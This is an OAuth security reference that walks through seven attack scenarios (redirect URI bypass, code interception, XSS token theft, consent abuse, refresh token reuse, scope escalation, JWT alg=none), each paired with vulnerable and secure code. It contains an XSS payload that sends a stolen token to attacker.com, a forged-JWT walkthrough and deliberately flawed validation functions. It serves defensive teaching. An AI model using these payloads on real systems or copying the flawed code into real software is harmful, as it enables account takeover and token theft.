# OAuth Attack Scenarios — Technical Reference

## Attack 1: Redirect URI Manipulation

### Root Cause
OAuth servers that use prefix matching, wildcard matching, or substring matching for redirect URI validation allow attackers to redirect authorization codes to domains they control.

### Vulnerable Code
```javascript
// 🔴 VULNERABLE: Prefix check
function validateRedirectUri(requested, registered) {
  return registered.some(uri => requested.startsWith(uri.replace('/callback', '')));
}
// registered: "http://localhost:3002/callback"
// attacker: "http://localhost:3002.evil.com/steal"
// startsWith("http://localhost:3002") → TRUE ← bypassed!
```

### Secure Code
```javascript
// 🟢 SECURE: Exact match only (RFC 6749 §3.1.2)
function validateRedirectUri(requested, registered) {
  return registered.includes(requested);
}
```

### Detection Query
Look for `REDIRECT_URI_MANIPULATION_ATTEMPT` events in the audit log with `severity: HIGH`.

---

## Attack 2: Authorization Code Interception

### Root Cause
Without PKCE, authorization codes are bearer tokens — anyone who obtains a code can exchange it for access tokens. Codes can leak via:
- Browser referrer header (when page loads external resources)
- Browser history
- Redirect to attacker-controlled URI (see Attack 1)
- Network interception on non-HTTPS connections
- Custom URI scheme hijacking on mobile

### Vulnerable Flow
```
1. Victim: GET /authorize?client_id=app&redirect_uri=app://callback
2. Auth server: redirect to app://callback?code=XYZ
3. Attacker app (also registered for app:// scheme): receives the redirect!
4. Attacker: POST /token {code: XYZ, client_id: app, ...}
5. Auth server: issues tokens ← no PKCE check
```

### Mitigation: PKCE
```javascript
// Client generates before /authorize:
const codeVerifier = crypto.randomBytes(32).toString('base64url');
const codeChallenge = crypto.createHash('sha256').update(codeVerifier).digest('base64url');

// Token exchange:
POST /token { code, code_verifier }
// Server verifies: SHA256(code_verifier) === stored_challenge
```

---

## Attack 3: Token Leakage via XSS

### Root Cause
Tokens in `localStorage` or `sessionStorage` are accessible to all JavaScript in the page origin, including injected scripts.

### XSS Payload Example
```javascript
// Injected via vulnerable comment field, URL parameter, etc.
const token = localStorage.getItem('access_token');
new Image().src = `https://attacker.com/steal?t=${encodeURIComponent(token)}`;
```

### Defense Architecture
```
localStorage (vulnerable):
  document.cookie ← accessible by JS
  localStorage ← accessible by JS
  sessionStorage ← accessible by JS
  
HttpOnly cookie (secure):
  Set-Cookie: access_token=JWT; HttpOnly; Secure; SameSite=Strict
  → document.cookie does NOT include HttpOnly cookies
  → JS cannot read it
  → XSS payload cannot steal it
```

---

## Attack 4: OAuth Consent Abuse

### Vectors
1. **Scope Abuse**: Registering a client that requests excessive permissions (admin, full account access)
2. **Social Engineering**: Misleading app name / description on consent screen
3. **Consent Screen Spoofing**: Hosting a fake consent page on a similar domain

### Mitigation Architecture
```
Scope Classification:
  "basic" scopes  (read, profile, email) → user consent sufficient
  "elevated" scopes (write, admin) → require:
    1. Client pre-registration approval by admin
    2. Explicit scope justification
    3. Enhanced consent screen with warnings

In the auth server (secure mode):
  if (scope.includes('admin') && !client.trusted) {
    return PENDING_ADMIN_APPROVAL;
  }
```

---

## Attack 5: Refresh Token Abuse

### Token Lifecycle Comparison

| Property | Vulnerable | Secure |
|----------|-----------|--------|
| Expiry | Never (10 years) | 30 days |
| Rotation | None | Per-use rotation |
| Reuse detection | None | Yes — revoke family |
| Revocation on password change | No | Yes |

### Refresh Token Rotation
```javascript
// 🔴 VULNERABLE: Token persists forever
function handleRefresh(refreshToken) {
  const newAccessToken = generateAccessToken();
  return { access_token: newAccessToken, refresh_token: refreshToken }; // Same RF!
}

// 🟢 SECURE: Token rotates on each use
function handleRefresh(refreshToken) {
  db.revoke(refreshToken); // Invalidate old
  const newRefreshToken = db.createRefreshToken(); // New one
  const newAccessToken = generateAccessToken();
  return { access_token: newAccessToken, refresh_token: newRefreshToken };
}
```

---

## Attack 6: Scope Escalation

### Vulnerable Server Behavior
```
Client registered with: { scopes: ["read", "profile"] }
Client requests: scope=read+profile+admin+write

Vulnerable server:
  → grants: read, profile, admin, write  ← all requested!

Secure server:
  → grants: read, profile               ← intersection only
```

### Enforcement Code
```javascript
// 🟢 SECURE: Enforce intersection
const grantedScopes = requestedScopes.filter(s => client.registeredScopes.includes(s));
```

---

## Attack 7: JWT Algorithm Confusion (alg=none)

### CVE Reference
CVE-2015-9235 — jsonwebtoken < 4.2.2  
CVE-2016-5431 — python-jose  

### Attack Mechanics
```
Original JWT:
  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.SIGNATURE

Step 1 — Decode:
  Header:  {"alg":"HS256"}
  Payload: {"sub":"alice","role":"user"}

Step 2 — Modify:
  Header:  {"alg":"none"}        ← remove algorithm
  Payload: {"sub":"alice","role":"admin"}  ← escalate role

Step 3 — Re-encode (no signature):
  eyJhbGciOiJub25lIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.

Step 4 — Submit to vulnerable server:
  jwt.decode(token)  ← base64 decode only, no signature check!
  decoded.role = "admin"  ← attacker wins
```

### Secure Verification
```javascript
// 🔴 VULNERABLE: Never use decode() for authentication
const decoded = jwt.decode(token); // No verification!

// 🟢 SECURE: Always use verify() with explicit algorithm whitelist
const decoded = jwt.verify(token, SECRET, {
  algorithms: ['HS256'],  // Whitelist — rejects "none", "RS256", etc.
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com',
});
```
